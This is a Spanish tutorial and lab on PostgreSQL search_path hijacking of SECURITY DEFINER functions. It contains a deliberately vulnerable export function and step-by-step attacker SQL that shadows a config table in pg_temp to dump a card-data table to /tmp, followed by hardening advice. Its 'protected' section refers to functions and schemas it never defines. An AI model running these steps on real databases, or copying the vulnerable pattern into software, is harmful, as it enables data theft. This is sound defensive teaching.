
# 🐘 PostgreSQL Hijacking, `SECURITY DEFINER` y el peligro oculto de `search_path`
 
> En PostgreSQL, **no calificar esquemas** + usar `SECURITY DEFINER` + dejar el `search_path` por default **abre la puerta a hijacking**, permitiendo que un usuario redireccione una función privilegiada a objetos maliciosos (especialmente temporales) **sin modificar el código**.



## 📌 ¿Qué es Hijacking en PostgreSQL?

En PostgreSQL, **hijacking** ocurre cuando un usuario logra que una consulta, función o proceso utilice **un objeto distinto al que el desarrollador esperaba**, **sin cambiar el SQL original**.

Esto sucede cuando:

*   El SQL **no califica el esquema** (`SELECT * FROM pwds`)
*   El motor resuelve el objeto usando el **`search_path`**
*   Un atacante **crea un objeto con el mismo nombre** en un esquema que se busca antes

📌 *El resultado*:  
La consulta se ejecuta correctamente… pero **contra el objeto equivocado**.

Esto **NO es SQL Injection**, es **resolución maliciosa de nombres**.



## 🔐 ¿Para qué sirve `SECURITY DEFINER`?

Por default, las funciones son:

```sql
SECURITY INVOKER
```

Esto significa:

> La función se ejecuta **con los permisos del usuario que la llama**.

### Entonces, ¿por qué existe `SECURITY DEFINER`?

`SECURITY DEFINER` permite que una función se ejecute **con los permisos de su dueño**, no del invocador.

Se usa para:

*   Exponer operaciones privilegiadas de forma controlada
*   Encapsular lógica administrativa
*   Permitir que roles con pocos permisos realicen acciones específicas

Ejemplo típico:

*   Usuario app\_user **NO puede** insertar en una tabla
*   Función es dueña `postgres`
*   app\_user llama la función
*   ✅ La insert se ejecuta con permisos de `postgres`

👉 **Esto es exactamente lo que hace peligrosa a la combinación con `search_path`.**



## 🧭 ¿Qué es `search_path` y para qué sirve?

`search_path` define **el orden de búsqueda de esquemas** cuando PostgreSQL encuentra un objeto **sin esquema explícito**.

Ejemplo:

```sql
SELECT * FROM pwds;
```

PostgreSQL busca `pwds` en los esquemas definidos en `search_path`, **en orden**.



## ⚠️ Comportamiento real y oculto de `search_path`

### 📍 Lo que ves normalmente

```sql
SHOW search_path;
```

```text
 "$user", public
```

Esto **confunde** a muchos DBAs, porque **NO muestra todo**.



### 📍 El `search_path` REAL por default

Internamente PostgreSQL usa:

```text
pg_temp, pg_catalog, "$user", public
```

📌 \*\*Pero `pg_temp` y `pg_catalog NO se muestran** en `SHOW search\_path\`.



## 🔎 Orden real de resolución de objetos

Cuando ejecutas esto:

```sql
SELECT * FROM pwds;
```

PostgreSQL busca así:

1.  **pg\_temp**        ← ⚠️ tablas temporales del usuario
2.  **pg\_catalog**    ← objetos del sistema
3.  **"$user"**       ← esquema con el mismo nombre del usuario
4.  **public**

🔴 **El primer objeto encontrado detiene la búsqueda.**



## 🧪 DEMO REAL: Hijacking completo paso a paso

### 1️⃣ Crear usuario y esquema

```sql
CREATE USER user_hijacking WITH SUPERUSER PASSWORD '123123';
CREATE SCHEMA IF NOT EXISTS user_hijacking;
```



### 2️⃣ Conectarse como el atacante

```bash
psql -U user_hijacking -d postgres
```



### 3️⃣ Crear tablas `pwds` en TODOS los esquemas

```sql
CREATE TEMP TABLE pwds(username text, pwd text);
INSERT INTO pg_temp.pwds VALUES ('jorge', 'ESTE ES EL ESQUEMA pg_temp');


SET allow_system_table_mods = on;
CREATE TABLE pg_catalog.pwds(username text primary key, pwd text);
INSERT INTO pg_catalog.pwds VALUES ('jorge', 'ESTE ES EL ESQUEMA pg_catalog');


CREATE TABLE user_hijacking.pwds(username text primary key, pwd text);
INSERT INTO user_hijacking.pwds VALUES ('jorge', 'ESTE ES EL ESQUEMA user_hijacking');


CREATE TABLE public.pwds(username text primary key, pwd text);
INSERT INTO public.pwds VALUES ('jorge', 'ESTE ES EL ESQUEMA PUBLIC');
```



### 4️⃣ Todas existen

```sql
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_name = 'pwds';
```

Resultado:

```text
pg_catalog
pg_temp_x
user_hijacking
public
```



### 5️⃣ Ejecutar la misma consulta SIN esquema

```sql
SELECT * FROM pwds;
```

✅ Resultado:

```text
ESTE ES EL ESQUEMA pg_temp
```



### 6️⃣ Eliminar objetos y observar el fallback

```sql
DROP TABLE pg_temp.pwds;
SELECT * FROM pwds;
-- pg_catalog

DROP TABLE pg_catalog.pwds;
SELECT * FROM pwds;
-- user_hijacking

DROP TABLE user_hijacking.pwds;
SELECT * FROM pwds;
-- public
```

📌 **Misma consulta, mismo SQL, distinto origen de datos con esto demostramos el orden real de como busca los objetos.**

---


  
# ✅ Recomendaciones de Seguridad (versión mejorada)

Estas recomendaciones **NO son opcionales** cuando trabajas con funciones en PostgreSQL, especialmente con `SECURITY DEFINER`.



## 🔐 Recomendaciones Críticas

### 1️⃣ **Califica siempre los esquemas**

Nunca permitas que PostgreSQL resuelva objetos usando `search_path`.

✅ Correcto:

```sql
SELECT * FROM auth.pwds;
```

❌ Incorrecto:

```sql
SELECT * FROM pwds;
```

👉 **Regla de oro**:

> Si el objeto no tiene esquema, el código es inseguro.



### 2️⃣ **Configura explícitamente el `search_path` en funciones**

Especialmente en funciones `SECURITY DEFINER`.

✅ Patrón recomendado:

```sql
ALTER FUNCTION auth.fn_xxx(...)
SET search_path TO auth, pg_temp;
```

✅ Variante ultra-segura:

```sql
SET search_path = '';
```

📌 Esto evita:

*   Hijacking por `pg_temp`
*   Hijacking por esquemas del usuario
*   Comportamiento no determinista



### 3️⃣ **Usa `SECURITY INVOKER` por defecto**

Solo utiliza `SECURITY DEFINER` cuando:

*   Sea realmente necesario
*   Existan controles estrictos de esquema
*   El código esté auditado

✅ Regla:

> Si no puedes explicar **por qué** necesita `SECURITY DEFINER`, **no lo uses**.



### 4️⃣ **Revoca EXECUTE al rol PUBLIC**

Por defecto, **PUBLIC puede ejecutar funciones**.

❌ Estado inseguro:

```sql
PUBLIC → EXECUTE
```

✅ Estado seguro:

```sql
REVOKE EXECUTE ON FUNCTION auth.fn_sensitive(...) FROM PUBLIC;
GRANT  EXECUTE ON FUNCTION auth.fn_sensitive(...) TO app_role;
```



### 5️⃣ **Limita o elimina CREATE TEMP TABLE**

Si el usuario no necesita tablas temporales, **revoca el permiso**.

```sql
REVOKE TEMP ON DATABASE mydb FROM user_hijacking;
```

📌 Esto reduce drásticamente:

*   Hijacking por `pg_temp`
*   Manipulación indirecta de funciones



### 6️⃣ **SQL dinámico: siempre seguro**

Nunca concatentes strings en SQL dinámico.

✅ Correcto:

```sql
EXECUTE format('COPY %I.%I TO %L', p_schema, p_table, p_path);
```

❌ Peligroso:

```sql
EXECUTE 'COPY ' || p_table || ' TO ' || p_path;
```



### 7️⃣ **Pruebas de seguridad (obligatorias)**

Toda función privilegiada debe tener pruebas que:

*   Creen `TEMP TABLE`
*   Intenten hijacking
*   Confirmen que la función **ignora** esos objetos




---



 

# 🧪 Laboratorio real de como un atacante aprovecha de hijacking 

 
## 🏢 Descripción del escenario empresarial (resumen)

En este laboratorio se simula como la empresa **DataCorp**, donde el equipo de bases de datos implementó una solución para que el equipo analistas de datos **exporte información a archivos CSV de forma controlada**, sin otorgar permisos directos sobre las tablas ni privilegios avanzados.

Para lograrlo, la empresa creó una **tabla de configuración** llamada `copy_conf`, cuyo propósito era **definir qué tablas pueden ser exportadas, a qué ruta y bajo qué condiciones**, mediante un simple estatus habilitado o deshabilitado.

Adicionalmente, desarrollaron una **función genérica con `SECURITY DEFINER`**, que únicamente:

*   Recibe el nombre del esquema y tabla como parámetro
*   Consulta la tabla `copy_conf`
*   Valida si la exportación está permitida
*   Ejecuta el `COPY` con la información previamente definida

Desde la perspectiva de la empresa, esta arquitectura era segura porque **la lógica crítica no estaba en manos del usuario evitando** evitando otorgarle el permiso pg_write_server_files, sino gobernada por una tabla administrativa, y porque la función no permitía ejecutar comandos arbitrarios sanitizando las entradas.

Este laboratorio demuestra cómo, a pesar de esa justificación legítima, **detalles de configuración no evaluados** pueden convertir una solución operativa válida en un **riesgo de seguridad**.

 
 
 
## 📦 Preparación del entorno

> Puedes correrlo en `psql` paso a paso. Ajusta puertos/rutas según tu servidor.

```sql
 

CREATE TABLE IF NOT EXISTS copy_conf (
    id              bigserial PRIMARY KEY,
    esquema         text        NOT NULL,                      -- esquema donde vive la tabla real
    tabla_nombre    text        NOT NULL,                      -- nombre de la tabla objetivo (SIN esquema)
    ruta_guardad    text        NOT NULL,                      -- ruta del archivo destino
    estatus         boolean     NOT NULL DEFAULT false,        -- si está habilitado para exportar
    UNIQUE (esquema, tabla_nombre)
);

-- 2) Datos sensibles (tabla real a exfiltrar)
CREATE TABLE IF NOT EXISTS customers_cards (
    card_id     bigint PRIMARY KEY,
    owner_name  text,
    card_number text
);

INSERT INTO customers_cards VALUES
(1, 'Jorge', '4111-1111-1111-1111'),
(2, 'Ana',   '5555-5555-5555-5555');

-- 3) Configuración para controlar la exportación , guardando el archivo en una carpeta muy segura
INSERT INTO copy_conf (esquema, tabla_nombre, ruta_guardad, estatus)
VALUES ('public', 'customers_cards', '/carpeta_segura/cards.csv', false);
```



## 🔴 **Escenario DESPROTEGIDO** (hijacking exitoso)

### Problemas 

1.  ❌ La función **no** define `SET search_path`
2.  ❌ La función **no** califica el esquema de la tabla; depende del `search_path`
3.  ❌ Por defaul postgresql otorga al usuario **PUBLIC** el permiso  `EXECUTE` sobre la funciónes nuevas por lo que no se esta revocando
4.  ❌ La función es `SECURITY DEFINER` (se ejecuta con más privilegios)

### Función vulnerable (usa `copy_conf`, pero insegura)

> Lee `copy_conf` por `tabla_nombre`, valida `estatus=true`, y ejecuta `COPY` **sin calificar** (permitiendo hijacking).

```sql

-- drop  FUNCTION public.fn_copy_by_conf(p_eschema_tabla TEXT, p_tabla_nombre TEXT);
CREATE OR REPLACE FUNCTION public.fn_copy_by_conf(p_eschema_tabla TEXT, p_tabla_nombre TEXT)
RETURNS void
LANGUAGE plpgsql
SET client_min_messages = notice
SECURITY DEFINER
AS $$
DECLARE
    v_ruta   text;
    v_query_exec text;
    v_status boolean;
BEGIN

    -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.
    SELECT c.ruta_guardad, c.estatus
    INTO   v_ruta, v_status
    FROM   copy_conf AS c --- ⚠️ VULNERABILIDAD: → dependerá del search_path real por no especificar el esquema     
    WHERE  c.tabla_nombre = p_tabla_nombre
		   and c.esquema =  p_eschema_tabla		
    LIMIT  1;	


    v_query_exec := format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);
    -- RAISE NOTICE '---> %', v_query_exec;	

    IF v_ruta IS NULL THEN
        RAISE EXCEPTION 'No existe configuración para la tabla %', p_tabla_nombre;
    END IF;

    IF v_status IS NOT TRUE THEN
        RAISE NOTICE 'Export deshabilitado para %', p_tabla_nombre;
        RETURN;
    END IF;

    EXECUTE v_query_exec;

    RAISE NOTICE 'Export completado: tabla=% ruta=%', p_tabla_nombre, v_ruta;
END;
$$;


```

 

### Ataque (usuario con pocos privilegios)

> El atacante crea un **objeto temporal** (vista o tabla) **con el mismo nombre** para **redirigir** la resolución.

```sql
-- para esto ya existia el usuario basico 
create user user_hijacking with password '123123';

-- Conéctate como un usuario "regular" que tenga TEMP y EXECUTE en la función:
-- psql -p 5432 -d test -U user_hijacking -h 127.0.0.1

SHOW search_path;
-- Verás: "$user", public
-- Recuerda: el orden real es: pg_temp, pg_catalog, "$user", public

 

-- 1) El atacante se da cuenta que existe la funcion que puede copiar tablas 
---  y se da cuenta que puede exportar cualquier tablas modificando el comportamiento de  la tabla copy_conf
user_hijacking@test> select proname,prosrc from pg_proc where prosrc ilike '%copy%';
+-----------------------------------+-----------------------------------------------------------------------------------------------------+
|              proname              |                                               prosrc                                                |
+-----------------------------------+-----------------------------------------------------------------------------------------------------+
| pg_copy_physical_replication_slot | pg_copy_physical_replication_slot_a                                                                 |
| pg_copy_physical_replication_slot | pg_copy_physical_replication_slot_b                                                                 |
| pg_copy_logical_replication_slot  | pg_copy_logical_replication_slot_a                                                                  |
| pg_copy_logical_replication_slot  | pg_copy_logical_replication_slot_b                                                                  |
| pg_copy_logical_replication_slot  | pg_copy_logical_replication_slot_c                                                                  |
| fn_copy_by_conf                   |                                                                                                    +|
|                                   | DECLARE                                                                                            +|
|                                   |     v_ruta   text;                                                                                 +|
|                                   |     v_query_exec text;                                                                             +|
|                                   |     v_status boolean;                                                                              +|
|                                   | BEGIN                                                                                              +|
|                                   |                                                                                                    +|
|                                   |     -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.                               +|
|                                   |     SELECT c.ruta_guardad, c.estatus                                                               +|
|                                   |     INTO   v_ruta, v_status                                                                        +|
|                                   |     FROM   copy_conf AS c                                                                          +|
|                                   |     WHERE  c.tabla_nombre = p_tabla_nombre                                                         +|
|                                   |    and c.esquema =  p_eschema_tabla                                                                +|
|                                   |     LIMIT  1;                                                                                      +|
|                                   |                                                                                                    +|
|                                   | -- ⚠️ VULNERABILIDAD: COPY SIN ESQUEMA → dependerá del search_path real                             +|
|                                   |     -- Aún usando %I para el identificador, el nombre NO está calificado.                          +|
|                                   |     v_query_exec := format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);+|
|                                   |     -- RAISE NOTICE '---> %', v_query_exec;                                                        +|
|                                   |                                                                                                    +|
|                                   |     IF v_ruta IS NULL THEN                                                                         +|
|                                   |         RAISE EXCEPTION 'No existe configuración para la tabla %', p_tabla_nombre;                 +|
|                                   |     END IF;                                                                                        +|
|                                   |                                                                                                    +|
|                                   |     IF v_status IS NOT TRUE THEN                                                                   +|
|                                   |         RAISE NOTICE 'Export deshabilitado para %', p_tabla_nombre;                                +|
|                                   |         RETURN;                                                                                    +|
|                                   |     END IF;                                                                                        +|
|                                   |                                                                                                    +|
|                                   |                                                                                                    +|
|                                   |     EXECUTE v_query_exec;                                                                          +|
|                                   |                                                                                                    +|
|                                   |     RAISE NOTICE 'Export completado: tabla=% ruta=%', p_tabla_nombre, v_ruta;                      +|
|                                   | END;                                                                                               +|
|                                   |                                                                                                     |
+-----------------------------------+-----------------------------------------------------------------------------------------------------+
(6 rows)

--- 2) Revisa si la funcion el Owner = postgres que es superuser y es Security = definer
postgres@test# \df+ public.fn_copy_by_conf
List of functions
+-[ RECORD 1 ]--------+-------------------------------------------+
| Schema              | public                                    |
| Name                | fn_copy_by_conf                           |
| Result data type    | void                                      |
| Argument data types | p_eschema_tabla text, p_tabla_nombre text |
| Type                | func                                      |
| Volatility          | volatile                                  |
| Parallel            | unsafe                                    |
| Owner               | postgres                                  |
| Security            | definer                                   |
| Access privileges   | NULL                                      |
| Language            | plpgsql                                   |
| Internal name       | NULL                                      |
| Description         | NULL                                      |
+---------------------+-------------------------------------------+

-- 3) VALIDA SI EL USUARIO PUBLIC TIENE PERMISOS el cual si lo que
--- significa que el tambien la va poder ejecutar 
SELECT  
	DISTINCT
	a.routine_schema 
	,grantee AS user_name
	,a.routine_name 
	,b.routine_type
	,privilege_type 
FROM information_schema.routine_privileges as a
LEFT JOIN 
	information_schema.routines  as b on a.routine_name=b.routine_name
where  
	NOT a.routine_schema in('pg_catalog','information_schema') 
	AND a.grantee in('PUBLIC')  and a.routine_name = 'fn_copy_by_conf'
ORDER BY a.routine_schema,a.routine_name ;
+----------------+-----------+-----------------+--------------+----------------+
| routine_schema | user_name |  routine_name   | routine_type | privilege_type |
+----------------+-----------+-----------------+--------------+----------------+
| public         | PUBLIC    | fn_copy_by_conf | FUNCTION     | EXECUTE        |
+----------------+-----------+-----------------+--------------+----------------+
(1 row)


---4 ) Valida si el usuario tiene permisos de public , esto porque el usuario public tiene el permiso por default
postgres@test# SELECT has_schema_privilege('public', 'public', 'CREATE');
+----------------------+
| has_schema_privilege |
+----------------------+
| t                    |
+----------------------+
(1 row)


-- 5 ) REvisa si tiene permiso para crear tablas temporales, esto porque el usuario public tiene el permiso por default
select * from has_database_privilege('user_hijacking','test','temp');
+------------------------+
| has_database_privilege |
+------------------------+
| t                      |
+------------------------+
(1 row)


--- 6 ) Intenta ejecutar la funcion lo que si tiene permiso 
SELECT public.fn_copy_by_conf('public','customers_cards');
NOTICE:  Export deshabilitado para customers_cards
+-----------------+
| fn_copy_by_conf |
+-----------------+
|                 |
+-----------------+
(1 row)

----7  intenta consultar la tabla
user_hijacking@test> select * from public.customers_cards;
ERROR:  permission denied for table customers_cards
Time: 0.620 ms

 
--- 8) Intenta validar las columnas usando la vista information_schema.columns , pero no le permite porque tiene una validacion de permisos
SELECT table_schema, table_name,column_name,data_type,is_nullable,character_maximum_length,numeric_precision, numeric_scale FROM information_schema.columns 
WHERE table_name in('customers_cards','copy_conf')
ORDER BY ordinal_position;
+--------------+------------+-------------+-----------+-------------+--------------------------+-------------------+---------------+
| table_schema | table_name | column_name | data_type | is_nullable | character_maximum_length | numeric_precision | numeric_scale |
+--------------+------------+-------------+-----------+-------------+--------------------------+-------------------+---------------+
+--------------+------------+-------------+-----------+-------------+--------------------------+-------------------+---------------+
(0 rows)

 
--- 9) revisa la query que se usa para la vista information_schema.columns y modifica la query quitando la validación 
 select * from pg_views where viewname = 'columns';


--- 10 ) usa la query modificada 
 SELECT  
    (nc.nspname)::information_schema.sql_identifier AS table_schema,
    (c.relname)::information_schema.sql_identifier AS table_name,
    (a.attnum)::information_schema.cardinal_number AS ordinal_position,
    (a.attname)::information_schema.sql_identifier AS column_name,
    (
        CASE
            WHEN (a.attnotnull OR ((t.typtype = 'd'::"char") AND t.typnotnull)) THEN 'NO'::text
            ELSE 'YES'::text
        END)::information_schema.yes_or_no AS is_nullable,
    (
        CASE
            WHEN (t.typtype = 'd'::"char") THEN
            CASE
                WHEN ((bt.typelem <> (0)::oid) AND (bt.typlen = '-1'::integer)) THEN 'ARRAY'::text
                WHEN (nbt.nspname = 'pg_catalog'::name) THEN format_type(t.typbasetype, NULL::integer)
                ELSE 'USER-DEFINED'::text
            END
            ELSE
            CASE
                WHEN ((t.typelem <> (0)::oid) AND (t.typlen = '-1'::integer)) THEN 'ARRAY'::text
                WHEN (nt.nspname = 'pg_catalog'::name) THEN format_type(a.atttypid, NULL::integer)
                ELSE 'USER-DEFINED'::text
            END
        END)::information_schema.character_data AS data_type,
    (information_schema._pg_char_max_length(information_schema._pg_truetypid(a.*, t.*), information_schema._pg_truetypmod(a.*, t.*)))::information_schema.cardinal_number AS character_maximum_length,
    -- (information_schema._pg_numeric_precision(information_schema._pg_truetypid(a.*, t.*), information_schema._pg_truetypmod(a.*, t.*)))::information_schema.cardinal_number AS numeric_precision,
    -- (information_schema._pg_numeric_scale(information_schema._pg_truetypid(a.*, t.*), information_schema._pg_truetypmod(a.*, t.*)))::information_schema.cardinal_number AS numeric_scale,
    (
    CASE
        WHEN (a.attgenerated = ''::"char") THEN pg_get_expr(ad.adbin, ad.adrelid)
        ELSE NULL::text
    END)::information_schema.character_data AS column_default
	
   FROM ((((((pg_attribute a
     LEFT JOIN pg_attrdef ad ON (((a.attrelid = ad.adrelid) AND (a.attnum = ad.adnum))))
     JOIN (pg_class c
     JOIN pg_namespace nc ON ((c.relnamespace = nc.oid))) ON ((a.attrelid = c.oid)))
     JOIN (pg_type t
     JOIN pg_namespace nt ON ((t.typnamespace = nt.oid))) ON ((a.atttypid = t.oid)))
     LEFT JOIN (pg_type bt
     JOIN pg_namespace nbt ON ((bt.typnamespace = nbt.oid))) ON (((t.typtype = 'd'::"char") AND (t.typbasetype = bt.oid))))
     LEFT JOIN (pg_collation co
     JOIN pg_namespace nco ON ((co.collnamespace = nco.oid))) ON (((a.attcollation = co.oid) AND ((nco.nspname <> 'pg_catalog'::name) OR (co.collname <> 'default'::name)))))
     LEFT JOIN (pg_depend dep
     JOIN pg_sequence seq ON (((dep.classid = ('pg_class'::regclass)::oid) AND (dep.objid = seq.seqrelid) AND (dep.deptype = 'i'::"char")))) ON (((dep.refclassid = ('pg_class'::regclass)::oid) AND (dep.refobjid = c.oid) AND (dep.refobjsubid = a.attnum))))
  WHERE ((NOT pg_is_other_temp_schema(nc.oid)) AND (a.attnum > 0) AND (NOT a.attisdropped) AND (c.relkind = ANY (ARRAY['r'::"char", 'v'::"char", 'f'::"char", 'p'::"char"]))  ) and  c.relname in('customers_cards','copy_conf') order by table_name,ordinal_position;

+--------------+-----------------+------------------+--------------+-------------+-----------+--------------------------+---------------------------------------+
| table_schema |   table_name    | ordinal_position | column_name  | is_nullable | data_type | character_maximum_length |            column_default             |
+--------------+-----------------+------------------+--------------+-------------+-----------+--------------------------+---------------------------------------+
| public       | copy_conf       |                1 | id           | NO          | bigint    |                     NULL | nextval('copy_conf_id_seq'::regclass) |
| public       | copy_conf       |                2 | esquema      | NO          | text      |                     NULL | NULL                                  |
| public       | copy_conf       |                3 | tabla_nombre | NO          | text      |                     NULL | NULL                                  |
| public       | copy_conf       |                4 | ruta_guardad | NO          | text      |                     NULL | NULL                                  |
| public       | copy_conf       |                5 | estatus      | NO          | boolean   |                     NULL | false                                 |
| public       | customers_cards |                1 | card_id      | YES         | bigint    |                     NULL | NULL                                  |
| public       | customers_cards |                2 | owner_name   | YES         | text      |                     NULL | NULL                                  |
| public       | customers_cards |                3 | card_number  | YES         | text      |                     NULL | NULL                                  |
+--------------+-----------------+------------------+--------------+-------------+-----------+--------------------------+---------------------------------------+


--- 5 )El atacante Recreo la tabla de copy_conf pero en una tabla temporal

CREATE TEMP TABLE copy_conf (
    id              bigserial PRIMARY KEY,
    esquema         text        NOT NULL,                
    tabla_nombre    text        NOT NULL,                    
    ruta_guardad    text        NOT NULL,                    
    estatus         boolean     NOT NULL DEFAULT false,        
    UNIQUE (esquema, tabla_nombre)
);

-- 6) Inserto la información que quiere descargar , cambio el nombre de la ruta 
INSERT INTO pg_temp.copy_conf (esquema, tabla_nombre, ruta_guardad, estatus)
VALUES ('public', 'customers_cards', '/tmp/dump_tabla_customers_cards.csv', true);

 
-- 2) Ejecutar la función vulnerable
SELECT public.fn_copy_by_conf('public','customers_cards');

```

> 🔥 **Impacto**: Aunque “parece” que copiamos una tabla temporal, **en realidad** el atacante **exfiltra** la tabla real (`customers_cards`) en el esquema pg_temp   
> **Mismo nombre, misma función, distinto objeto según `search_path`**. Integridad y confidencialidad comprometidas.



## ✅ **Escenario PROTEGIDO** (ataque frustrado)

### Medidas de endurecimiento aplicadas

*   Fijar `search_path` **dentro de la función** (o vía `ALTER FUNCTION`)
*   **Calificar** siempre con esquema el objeto a copiar
*   Validar que la tabla existe **exactamente** donde dice la configuración
*   **Revocar** `EXECUTE` a `PUBLIC` y otorgar solo al rol de la app
*   (Opcional) **Revocar** `TEMP` a `PUBLIC`

### Función segura (usa `copy_conf` correctamente)

```sql
-- drop  FUNCTION public.fn_copy_by_conf(p_eschema_tabla TEXT, p_tabla_nombre TEXT);
CREATE OR REPLACE FUNCTION public.fn_copy_by_conf(p_eschema_tabla TEXT, p_tabla_nombre TEXT)
RETURNS void
LANGUAGE plpgsql
SET client_min_messages = notice
SET search_path = public, pg_temp   -- search_path controlado y determinista
SECURITY DEFINER
AS $$
DECLARE
    v_ruta   text;
    v_query_exec text;
    v_status boolean;
BEGIN

    -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.
    SELECT c.ruta_guardad, c.estatus
    INTO   v_ruta, v_status
    FROM   public.copy_conf AS c --- especifica  el esquema al objeto
    WHERE  c.tabla_nombre = p_tabla_nombre
		   and c.esquema =  p_eschema_tabla		
    LIMIT  1;	
	

    v_query_exec := format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);
    -- RAISE NOTICE '---> %', v_query_exec;	

    IF v_ruta IS NULL THEN
        RAISE EXCEPTION 'No existe configuración para la tabla %', p_tabla_nombre;
    END IF;

    IF v_status IS NOT TRUE THEN
        RAISE NOTICE 'Export deshabilitado para %', p_tabla_nombre;
        RETURN;
    END IF;

    EXECUTE v_query_exec;

    RAISE NOTICE 'Export completado: tabla=% ruta=%', p_tabla_nombre, v_ruta;
END;
$$;



-- Endurecimiento de permisos:
REVOKE EXECUTE ON FUNCTION fn_copy_by_conf_secure(text) FROM PUBLIC;
REVOKE TEMP ON DATABASE postgres FROM PUBLIC;
GRANT  EXECUTE ON FUNCTION fn_copy_by_conf_secure(text) TO app_role;

-- (Opcional) Si tu user_hijacking NO requiere temporales:
-- REVOKE TEMP ON DATABASE postgres FROM user_hijacking;

```

### Intento de ataque (fallido)

```sql
-- El atacante de nuevo crea TEMP VIEW con el mismo nombre:
CREATE TEMP VIEW customers_cards AS
SELECT * FROM bank.customers_cards;

-- Llama a la función segura:
SELECT bank.fn_copy_by_conf_secure('customers_cards');

-- Resultado:
-- La función siempre ejecuta COPY contra "bank.customers_cards"
-- porque:
-- 1) Fijamos search_path
-- 2) Calificamos con esquema desde copy_conf
-- 3) Validamos existencia exacta con to_regclass
-- → NO se usa pg_temp
```

> 🎉 **El hijacking fracasa**. El `COPY` exporta **solo** lo que dice tu `copy_conf` (esquema + tabla exacta).



## 🛡️ Recomendaciones (versión pulida y accionable)

1.  **Califica el esquema SIEMPRE**
    > Si el SQL usa objetos sin esquema, el código es inseguro.

2.  **Fija `search_path` en funciones (especialmente `SECURITY DEFINER`)**
    *   Patrón recomendado: `SET search_path TO <esquema_de_confianza>, pg_temp`
    *   Modo estricto: `SET search_path = ''` (fuerza calificación absoluta)

3.  **Usa `SECURITY INVOKER` por defecto**  
    `SECURITY DEFINER` solo cuando sea estrictamente necesario y auditable.

4.  **Revoca `EXECUTE` a `PUBLIC`**  
    Otorga `EXECUTE` únicamente a los roles de aplicación que lo necesiten.

5.  **Evita SQL dinámico inseguro**  
    Usa `format('%I.%I', esquema, tabla)` y `format('%L', ruta)` o `USING`.

6.  **Pruebas obligatorias de hijacking**  
    Crea `TEMP VIEW/TABLE` con el mismo nombre y verifica que la función **mantiene** el esquema correcto.

7.  Revoca `CREATE TEMP` a `PUBLIC`
    Si el rol no requiere temporales: `REVOKE TEMP ON DATABASE <db> FROM PUBLIC;`


---

### Links
```
https://www.cybertec-postgresql.com/en/abusing-security-definer-functions/
https://github.com/timescale/pgspot/blob/main/REFERENCE.md
https://supabase.com/docs/guides/database/database-advisors?queryGroups=lint&lint=0011_function_search_path_mutable
https://dba.stackexchange.com/questions/211055/how-could-a-security-definer-function-in-pg-be-insecure-with-an-improper-searc
```

  
 
